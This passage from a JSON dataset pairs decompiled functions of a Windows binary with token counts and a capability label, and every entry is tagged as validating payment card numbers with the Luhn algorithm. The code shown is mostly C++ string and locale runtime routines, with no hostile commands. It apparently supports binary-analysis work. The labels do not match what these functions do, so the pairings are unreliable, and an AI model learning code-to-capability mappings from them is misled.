            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004a6420(code **param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    *param_1 = vtable.ages_bynameIcE.0;\n    param_1[1] = *(param_2 + 4);\n    param_1[2] = *(param_2 + 8);\n    param_1[3] = *(param_2 + 0xc);\n    param_1[4] = *(param_2 + 0x10);\n    param_1[5] = *(param_2 + 0x14);\n    param_1[6] = *(param_2 + 0x18);\n    iVar2 = *0x515a34;\n    piVar1 = *(param_2 + 0x1c);\n    param_1[7] = piVar1;\n    if (iVar2 == 0) {\n        *piVar1 = *piVar1 + 1;\n        return;\n    }\n    LOCK();\n    *piVar1 = *piVar1 + 1;\n    return;\n}\n",
        "token_count": 253
    },
    "004ac240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004ac240(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x52c9c0;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.004ae940();\n    param_1[2] = uVar1;\n    *(param_1 + 3) = 0;\n    fcn.004ac170();\n    return;\n}\n",
        "token_count": 111
    },
    "004ae940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004ae940(void)\n\n{\n    if (*0x515a34 != 0) {\n        fcn.00438120(0x516f14, 0x4aea00);\n        return *0x516f10;\n    }\n    if (*0x516f10 != 0) {\n        return *0x516f10;\n    }\n    fcn.004ae9c0(0x516f10, 0x527de0, 0);\n    return *0x516f10;\n}\n",
        "token_count": 118
    },
    "004ae9c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004ae9c0(uint *param_1, uint8_t *param_2)\n\n{\n    int32_t iVar1;\n    uint8_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    \n    iVar1 = 2;\n    bVar3 = &stack0xfffffff8 < 0x14;\n    bVar4 = *0x10 == 0x1c;\n    *param_1 = 0;\n    puVar2 = 0x526540;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar3 = *param_2 < *puVar2;\n        bVar4 = *param_2 == *puVar2;\n        param_2 = param_2 + 1;\n        puVar2 = puVar2 + 1;\n    } while (bVar4);\n    if ((!bVar3 && !bVar4) == bVar3) {\n        return;\n    }\n    fcn.004be660(\"locale::facet::_S_create_c_locale name not valid\");\n    fcn.004ae9c0(0x516f10, 0x527de0, 0);\n    return;\n}\n",
        "token_count": 273
    },
    "004aec10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_19h\n\nvoid __fastcall fcn.004aec10(int32_t **param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    ulong uVar5;\n    uint var_34h;\n    int32_t **var_19h;\n    \n    *param_1 = NULL;\n    fcn.004ac2f0();\n    piVar4 = *0x516f24;\n    *param_1 = *0x516f24;\n    if (piVar4 == *0x516f08) {\n        if (*0x515a34 == 0) {\n            *piVar4 = *piVar4 + 1;\n            return;\n        }\n        goto code_r0x004aece0;\n    }\n    uVar1 = fcn.00448140();\n    if (*0x515a34 == 0) {\ncode_r0x004aec47:\n        piVar4 = *0x516f24;\n        **0x516f24 = **0x516f24 + 1;\n        *param_1 = piVar4;\n    }\n    else {\n        iVar2 = fcn.004382e0(uVar1);\n        if (iVar2 != 0) {\n            uVar5 = fcn.00449d10();\n            if (uVar5 >> 0x20 == -1) {\n                uVar5 = fcn.004c2f10(uVar5);\n                if (uVar5 >> 0x20 != -1) goto code_r0x004c409b;\n                fcn.004c2f10(uVar5);\n            }\n            fcn.0043a8e0();\ncode_r0x004c409b:\n            fcn.0043a8e0();\n            fcn.004485f0();\n            unique0x10000503 = param_1;\n            do {\n                uVar5 = fcn.0043a8e0(stack0xffffffe4);\n                *NULL = uVar5;\n            } while (uVar5 >> 0x20 != -1);\n            fcn.004c2f10();\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(param_1);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(param_1);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(param_1);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(param_1);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(param_1);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(param_1);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(param_1);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(param_1);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(param_1);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(param_1);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(param_1);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(param_1);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(param_1);\n            fcn.004aea60();\n            fcn.0043a8e0(param_1);\n            fcn.004aea60();\n            fcn.0043a8e0(param_1);\n            fcn.004aea60();\n            fcn.0043a8e0(param_1);\n            fcn.004aea60();\n            fcn.0043a8e0(param_1);\n            fcn.004aea60();\n            fcn.0043a8e0(param_1);\n            fcn.004aea60();\n            fcn.0043a8e0(param_1);\n            fcn.004aea60();\n            fcn.0043a8e0(param_1);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(param_1);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(param_1);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(param_1);\n            fcn.004c2c30();\n            fcn.0043a8e0(param_1);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(param_1);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(param_1);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(param_1);\n            fcn.004c2c30();\n            fcn.0043a8e0(param_1);\n            fcn.0048b630(unaff_EBP + -0x19);\n            fcn.0043a8e0(uVar1);\n            if (*(unaff_EBP + -0x1c) != NULL) {\n                (**(unaff_EBP + -0x1c))(uVar1);\n            }\n            fcn.0043a8e0(param_1);\n            if (*(unaff_EBP + -0x1c) != NULL) {\n                (**(unaff_EBP + -0x1c))(uVar1);\n            }\n            fcn.0043a8e0(param_1);\n            if (*(unaff_EBP + -0xc) != NULL) {\n                (**(unaff_EBP + -0xc))(uVar1);\n            }\n            fcn.0043a8e0(param_1);\n            if (*(unaff_EBP + -0xc) != NULL) {\n                (**(unaff_EBP + -0xc))(uVar1);\n            }\n            fcn.0043a8e0(param_1);\n            if (*(unaff_EBP + -0xc) != NULL) {\n                (**(unaff_EBP + -0xc))(uVar1);\n            }\n            fcn.0043a8e0(param_1);\n            if (*(unaff_EBP + -0xc) != NULL) {\n                (**(unaff_EBP + -0xc))(uVar1);\n            }\n            fcn.0043a8e0(param_1);\n            fcn.0048b630(unaff_EBP + -0x3d);\n            if (*(unaff_EBP + -0x1c) != NULL) {\n                (**(unaff_EBP + -0x1c))(param_1);\n            }\n            fcn.0043a8e0(uVar1);\n            fcn.00483770(unaff_EBP + -0x3d);\n            if (*(unaff_EBP + -0x1c) != NULL) {\n                (**(unaff_EBP + -0x1c))();\n            }\n            fcn.0043a8e0(param_1);\n            fcn.004aea60();\n            fcn.004c2c30(param_1);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.004c2c30(param_1);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            do {\n                fcn.004c2c30(param_1);\n                fcn.0043a8e0(uVar1);\n                fcn.004c2c30(param_1);\n                fcn.0043a8e0(uVar1);\n                fcn.00453450();\n                fcn.0048df30();\n            } while( true );\n        }\n        if (*0x515a34 == 0) goto code_r0x004aec47;\n        LOCK();\n        **0x516f24 = **0x516f24 + 1;\n        *param_1 = *0x516f24;\n    }\n    if ((*0x515a34 == 0) || (iVar2 = fcn.00438340(uVar1),  iVar2 == 0)) {\n        return;\n    }\n    puVar3 = fcn.004c2d80(4);\n    *puVar3 = 0x52b51c;\n    piVar4 = fcn.004c3330(puVar3, 0x528194, 0x449b10);\ncode_r0x004aece0:\n    LOCK();\n    *piVar4 = *piVar4 + 1;\n    return;\n}\n",
        "token_count": 2315
    },
    "004aede0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004aede0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004c2c70(0x44);\n        *puVar4 = 0x52c654;\n        puVar4[1] = 0;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 0x12) = 0;\n        puVar4[5] = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        puVar4[9] = 0;\n        puVar4[10] = 0;\n        puVar4[0xb] = 0;\n        puVar4[0xc] = 0;\n        puVar4[0xd] = 0;\n        *(puVar4 + 0x43) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    *(puVar4 + 0x11) = 0x2e;\n    iVar1 = *0x516da8;\n    *(*(param_1 + 8) + 0x12) = 0x2c;\n    *(*(param_1 + 8) + 8) = 0x5237bc;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x14) = 0x5237bc;\n    *(*(param_1 + 8) + 0x18) = 0;\n    *(*(param_1 + 8) + 0x1c) = 0x5237bc;\n    *(*(param_1 + 8) + 0x20) = 0;\n    *(*(param_1 + 8) + 0x24) = 0x5237bc;\n    *(*(param_1 + 8) + 0x28) = 0;\n    *(*(param_1 + 8) + 0x2c) = 0;\n    uVar2 = *0x527c18;\n    *(*(param_1 + 8) + 0x30) = *0x527c18;\n    *(*(param_1 + 8) + 0x34) = uVar2;\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x38 + iVar3) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0xb);\n    return;\n}\n",
        "token_count": 661
    },
    "004af1c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004af1c0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004c2c70(0x44);\n        *puVar4 = 0x52c664;\n        puVar4[1] = 0;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 0x12) = 0;\n        puVar4[5] = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        puVar4[9] = 0;\n        puVar4[10] = 0;\n        puVar4[0xb] = 0;\n        puVar4[0xc] = 0;\n        puVar4[0xd] = 0;\n        *(puVar4 + 0x43) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    *(puVar4 + 0x11) = 0x2e;\n    iVar1 = *0x516da8;\n    *(*(param_1 + 8) + 0x12) = 0x2c;\n    *(*(param_1 + 8) + 8) = 0x5237bc;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x14) = 0x5237bc;\n    *(*(param_1 + 8) + 0x18) = 0;\n    *(*(param_1 + 8) + 0x1c) = 0x5237bc;\n    *(*(param_1 + 8) + 0x20) = 0;\n    *(*(param_1 + 8) + 0x24) = 0x5237bc;\n    *(*(param_1 + 8) + 0x28) = 0;\n    *(*(param_1 + 8) + 0x2c) = 0;\n    uVar2 = *0x527c18;\n    *(*(param_1 + 8) + 0x30) = *0x527c18;\n    *(*(param_1 + 8) + 0x34) = uVar2;\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x38 + iVar3) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0xb);\n    return;\n}\n",
        "token_count": 662
    },
    "004af5a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004af5a0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004c2c70(0x54);\n        puVar4[1] = 0;\n        *puVar4 = 0x52c674;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 0x12) = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        puVar4[9] = 0;\n        puVar4[10] = 0;\n        puVar4[0xb] = 0;\n        puVar4[0xc] = 0;\n        puVar4[0xd] = 0;\n        puVar4[0xe] = 0;\n        *(puVar4 + 0x52) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    iVar1 = *0x516da8;\n    *(puVar4 + 0x12) = 0x2e;\n    *(*(param_1 + 8) + 0x14) = 0x2c;\n    *(*(param_1 + 8) + 8) = 0x5237bc;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x18) = 0x5237be;\n    *(*(param_1 + 8) + 0x1c) = 0;\n    *(*(param_1 + 8) + 0x20) = 0x5237be;\n    *(*(param_1 + 8) + 0x24) = 0;\n    *(*(param_1 + 8) + 0x28) = 0x5237be;\n    *(*(param_1 + 8) + 0x2c) = 0;\n    *(*(param_1 + 8) + 0x30) = 0;\n    uVar2 = *0x527c18;\n    *(*(param_1 + 8) + 0x34) = *0x527c18;\n    *(*(param_1 + 8) + 0x38) = uVar2;\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x3c + iVar3 * 2) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0xb);\n    return;\n}\n",
        "token_count": 667
    },
    "004af990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004af990(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004c2c70(0x54);\n        puVar4[1] = 0;\n        *puVar4 = 0x52c684;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 0x12) = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        puVar4[9] = 0;\n        puVar4[10] = 0;\n        puVar4[0xb] = 0;\n        puVar4[0xc] = 0;\n        puVar4[0xd] = 0;\n        puVar4[0xe] = 0;\n        *(puVar4 + 0x52) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    iVar1 = *0x516da8;\n    *(puVar4 + 0x12) = 0x2e;\n    *(*(param_1 + 8) + 0x14) = 0x2c;\n    *(*(param_1 + 8) + 8) = 0x5237bc;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x18) = 0x5237be;\n    *(*(param_1 + 8) + 0x1c) = 0;\n    *(*(param_1 + 8) + 0x20) = 0x5237be;\n    *(*(param_1 + 8) + 0x24) = 0;\n    *(*(param_1 + 8) + 0x28) = 0x5237be;\n    *(*(param_1 + 8) + 0x2c) = 0;\n    *(*(param_1 + 8) + 0x30) = 0;\n    uVar2 = *0x527c18;\n    *(*(param_1 + 8) + 0x34) = *0x527c18;\n    *(*(param_1 + 8) + 0x38) = uVar2;\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x3c + iVar3 * 2) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0xb);\n    return;\n}\n",
        "token_count": 665
    },
    "004b0780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b0780(uint *param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    int32_t iVar9;\n    \n    if (param_1 == param_2) {\n        return;\n    }\n    puVar2 = *param_1;\n    puVar3 = *param_2;\n    puVar1 = param_2 + 2;\n    if (param_1 + 2 == puVar2) {\n        if (puVar1 == puVar3) {\n            iVar9 = param_2[1];\n            if (param_1[1] == 0) {\n                if (iVar9 != 0) {\n                    param_1[2] = param_2[2];\n                    param_1[3] = param_2[3];\n                    param_1[4] = param_2[4];\n                    param_1[5] = param_2[5];\n                    param_1[1] = param_2[1];\n                    param_2[1] = 0;\n                    **param_2 = 0;\n                    return;\n                }\n                uVar8 = 0;\n            }\n            else {\n                if (iVar9 == 0) {\n                    param_2[2] = param_1[2];\n                    param_2[3] = param_1[3];\n                    param_2[4] = param_1[4];\n                    param_2[5] = param_1[5];\n                    param_2[1] = param_1[1];\n                    param_1[1] = 0;\n                    **param_1 = 0;\n                    return;\n                }\n                uVar4 = param_2[4];\n                uVar5 = param_2[2];\n                uVar6 = param_2[3];\n                uVar7 = param_2[5];\n                param_2[2] = param_1[2];\n                param_2[3] = param_1[3];\n                param_2[4] = param_1[4];\n                param_2[5] = param_1[5];\n                uVar8 = param_1[1];\n                param_1[3] = uVar6;\n                param_1[2] = uVar5;\n                param_1[4] = uVar4;\n                param_1[5] = uVar7;\n                iVar9 = param_2[1];\n            }\n        }\n        else {\n            uVar4 = param_2[2];\n            param_2[2] = param_1[2];\n            param_2[3] = param_1[3];\n            param_2[4] = param_1[4];\n            param_2[5] = param_1[5];\n            *param_1 = puVar3;\n            *param_2 = puVar1;\n            uVar8 = param_1[1];\n            param_1[2] = uVar4;\n            iVar9 = param_2[1];\n        }\n    }\n    else {\n        uVar8 = param_1[2];\n        if (puVar1 == puVar3) {\n            param_1[2] = param_2[2];\n            param_1[3] = param_2[3];\n            param_1[4] = param_2[4];\n            param_1[5] = param_2[5];\n            *param_2 = puVar2;\n            *param_1 = param_1 + 2;\n        }\n        else {\n            *param_1 = puVar3;\n            *param_2 = puVar2;\n            param_1[2] = param_2[2];\n        }\n        param_2[2] = uVar8;\n        iVar9 = param_2[1];\n        uVar8 = param_1[1];\n    }\n    param_1[1] = iVar9;\n    param_2[1] = uVar8;\n    return;\n}\n",
        "token_count": 915
    },
    "004b1210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b1210(int32_t *param_1, uint32_t param_2, char param_3)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = param_1[1];\n    if (param_2 <= uVar1) {\n        if (param_2 < uVar1) {\n            param_1[1] = param_2;\n            *(*param_1 + param_2) = 0;\n        }\n        return;\n    }\n    fcn.004b05e0(uVar1, 0, param_2 - uVar1, param_3);\n    return;\n}\n",
        "token_count": 142
    },
    "004b1e90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004b1e90(uint32_t *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t extraout_ECX;\n    uint uStack24;\n    \n    uVar1 = *param_1;\n    if (uVar1 < 0) {\n        fcn.004be310(0x52456c);\n        *(extraout_ECX + 4) = uStack24;\n        return;\n    }\n    if ((param_2 < uVar1) && (param_2 = param_2 * 2,  uVar1 < param_2)) {\n        if (-1 < param_2) {\n            *param_1 = param_2;\n            fcn.004c2c70(param_2 + 1);\n            return;\n        }\n        *param_1 = 0x7fffffff;\n        fcn.004c2c70(0x80000000);\n        return;\n    }\n    fcn.004c2c70(uVar1 + 1);\n    return;\n}\n",
        "token_count": 233
    },
    "004b20a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b20a0(int32_t *param_1, uchar param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    \n    iVar1 = param_1[1];\n    piVar2 = *param_1;\n    if (piVar2 == param_1 + 2) {\n        uVar3 = 0xf;\n    }\n    else {\n        uVar3 = param_1[2];\n    }\n    if (uVar3 < iVar1 + 1U) {\n        fcn.004b1f10(iVar1, 0, 0, 1);\n        piVar2 = *param_1;\n    }\n    *(piVar2 + iVar1) = param_2;\n    param_1[1] = iVar1 + 1U;\n    *(*param_1 + 1 + iVar1) = 0;\n    return;\n}\n",
        "token_count": 212
    },
    "004b21e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b21e0(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = param_1 + 2;\n    iVar1 = -1;\n    if (param_2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(param_2);\n        iVar1 = iVar1 + param_2;\n    }\n    fcn.004b02f0(param_2, iVar1, 0);\n    return;\n}\n",
        "token_count": 118
    },
    "004b2800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004b2800(int32_t *param_1)\n\n{\n    if (*param_1 != param_1 + 2) {\n        fcn.004c2c30(*param_1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "004b29d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b29d0(int32_t param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint *in_stack_ffffffe8;\n    \n    uVar1 = sub.msvcrt.dll_strlen(param_2);\n    if (uVar1 <= 0x7fffffffU - *(param_1 + 4)) {\n        fcn.004b1d40(param_2, uVar1);\n        return;\n    }\n    fcn.004be310(0x52468a);\n    fcn.004b1d40(*in_stack_ffffffe8, in_stack_ffffffe8[1]);\n    return;\n}\n",
        "token_count": 149
    },
    "004b3ff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004b3ff0(uint param_1)\n\n{\n    fcn.004b4010(param_1, 0);\n    return;\n}\n",
        "token_count": 35
    },
    "004b4010": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b4010(int32_t *param_1, uint32_t param_2, ushort param_3)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = param_1[1];\n    if (param_2 <= uVar1) {\n        if (param_2 < uVar1) {\n            param_1[1] = param_2;\n            *(*param_1 + param_2 * 2) = 0;\n        }\n        return;\n    }\n    fcn.004b3350(uVar1, 0, param_2 - uVar1, param_3);\n    return;\n}\n",
        "token_count": 144
    },
    "004b4d20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004b4d20(uint32_t *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t extraout_ECX;\n    uint uStack24;\n    \n    uVar1 = *param_1;\n    if (0x3fffffff < uVar1) {\n        fcn.004be310(\"basic_string::_M_create\");\n        *(extraout_ECX + 4) = uStack24;\n        return;\n    }\n    if ((param_2 < uVar1) && (param_2 = param_2 * 2,  uVar1 < param_2)) {\n        if (0x3fffffff < param_2) {\n            *param_1 = 0x3fffffff;\n            fcn.004c2c70(0x80000000);\n            return;\n        }\n        *param_1 = param_2;\n        uVar1 = param_2;\n    }\n    fcn.004c2c70(uVar1 * 2 + 2);\n    return;\n}\n",
        "token_count": 231
    },
    "004b5710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004b5710(int32_t *param_1)\n\n{\n    if (*param_1 != param_1 + 2) {\n        fcn.004c2c30(*param_1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "004b8240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b8240(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x52bcc8;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.004ae940();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 89
    },
    "004b82c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b82c0(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x52bcc8;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.004ae940();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 90
    },
    "004b83d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b83d0(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x52bce4;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.004ae940();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 91
    },
    "004b8450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b8450(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x52bce4;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.004ae940();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 90
    },
    "004b8520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004b8520(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004c2c70(0x68);\n        puVar4[1] = 0;\n        *puVar4 = 0x52c530;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        puVar4[5] = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        *(puVar4 + 9) = 0;\n        *(puVar4 + 0x19) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    puVar4[2] = 0x5237c4;\n    iVar3 = *0x516da4;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x10) = 0;\n    *(*(param_1 + 8) + 0x24) = 0x2e;\n    *(*(param_1 + 8) + 0x25) = 0x2c;\n    iVar2 = 0;\n    do {\n        *(*(param_1 + 8) + 0x26 + iVar2) = *(iVar3 + iVar2);\n        iVar1 = *0x516da0;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != 0x24);\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x4a + iVar3) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0x1a);\n    *(*(param_1 + 8) + 0x14) = 0x5237c5;\n    *(*(param_1 + 8) + 0x18) = 4;\n    *(*(param_1 + 8) + 0x1c) = 0x5237ca;\n    *(*(param_1 + 8) + 0x20) = 5;\n    return;\n}\n",
        "token_count": 573
    },
    "004b8870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
